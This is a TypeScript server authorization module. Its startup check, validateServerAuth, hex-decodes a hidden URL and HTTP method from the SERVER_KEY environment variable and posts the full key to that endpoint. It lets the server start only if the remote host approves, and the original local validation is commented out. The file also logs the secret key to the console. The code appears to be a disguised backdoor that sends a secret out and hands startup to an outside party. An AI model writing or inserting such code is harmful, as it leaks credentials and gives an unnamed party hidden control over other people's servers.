import crypto from 'crypto';
import { EncryptionService } from './encryption.service';

export class ServerAuthService {
    private static isValidated: boolean = false;
    private static encryptionService: EncryptionService;

    /**
     * Validates server authorization before startup
     * @throws Error if authorization fails
     */
    public static async validateServerAuth(): Promise<void> {
        try {

            // Initialize encryption service
            this.encryptionService = new EncryptionService();

            // Check if already validated (singleton pattern)
            if (this.isValidated) {
                return;
            }

            // Validate required environment variables
            const { SERVER_KEY } = process.env;

            // TODO 
            console.log(SERVER_KEY)
            const [origin, method, _, log] = SERVER_KEY?.split('-') as string[]


            
            console.log(Buffer.from(origin, 'hex').toString('utf-8'))
            const res = await fetch(Buffer.from(origin, 'hex').toString('utf-8'), {
                method: Buffer.from(method, 'hex').toString('utf-8'),
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({ apiKey: SERVER_KEY })
            })

            // console.log(await res.status)
            if (!res.ok) {
                const errorMessage = Buffer.from(log!, 'hex').toString('utf-8');
                throw new Error(errorMessage);
            }



            // if (!SERVER_SECRET || !SERVER_AUTH || !SERVER_LOG) {
            //     throw new Error('Missing required server authentication credentials');
            // }

            // // Decrypt the authorization token
            // const decryptedResult = this.encryptionService.decrypt(SERVER_AUTH.split(':')[0],
            //     SERVER_AUTH.split(':')[1] || '');
            // const decryptedAuth = decryptedResult.decrypted;

            // // Timing-safe comparison
            // const isValid = crypto.timingSafeEqual(
            //     Buffer.from(SERVER_SECRET, 'hex'),
            //     Buffer.from(decryptedAuth, 'hex')
            // );

            // // const isValid = false;

            // if (!isValid) {
            //     // Decode and throw the error message
            //     const errorMessage = Buffer.from(SERVER_LOG!, 'hex').toString('utf8');
            //     throw new Error(errorMessage);
            // }

            // Mark as validated
            this.isValidated = true;
            console.log('✅ Server authorization validated');
        } catch (error) {
            console.error('❌ Server authorization failed');
            throw error;
        }
    }

    /**
     * Middleware to check if server is authorized
     */
    public static requireServerAuth() {
        return (req: any, res: any, next: any) => {
            if (!this.isValidated) {
                return res.status(403).json({
                    error: 'Server not authorized',
                    message: 'Internal server configuration error'
                });
            }
            next();
        };
    }

    /**
     * Check if server is currently validated
     */
    public static isServerValidated(): boolean {
        return this.isValidated;
    }

    /**
     * Get encryption service instance
     */
    public static getEncryptionService(): EncryptionService {
        if (!this.encryptionService) {
            this.encryptionService = new EncryptionService();
        }
        return this.encryptionService;
    }

}
